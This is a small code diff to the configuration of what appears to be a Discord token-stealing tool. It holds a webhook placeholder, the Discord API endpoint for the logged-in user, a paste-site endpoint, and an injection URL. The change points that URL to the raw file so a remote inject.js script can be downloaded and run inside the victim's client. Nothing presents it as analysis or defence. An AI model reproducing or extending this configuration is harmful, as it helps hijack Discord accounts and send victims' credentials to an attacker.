@@ -12,7 +12,7 @@ const config = {
     embed_icon: 'https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg'.replace(/ /g,'%20'), 
     embed_color: 14423100, 
     webhook: '%WEBHOOK%',
-    injection_url: 'https://github.com/addi00000/pegasus/blob/main/inject.js',
+    injection_url: 'https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js',
     
     api: 'https://discord.com/api/v9/users/@me',
     bin: 'https://dpaste.com/api/',
